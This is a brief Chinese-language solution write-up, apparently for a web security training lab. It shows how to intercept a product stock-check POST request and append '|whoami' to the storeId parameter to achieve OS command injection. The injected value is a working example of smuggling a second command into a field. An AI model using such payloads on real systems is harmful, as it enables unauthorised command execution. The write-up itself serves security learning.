Lab description#

Solution#

  1. 随机点击一个商品的View details
  2. 点击商品详细页最下方的Check stock，对应Request
    POST /product/stock HTTP/2

productId=1&storeId=1
  3. 修改参数storeId为1|whoami，发送请求后即可解题
    POST /product/stock HTTP/2

productId=1&storeId=1|whoami

    HTTP/2 200 OK
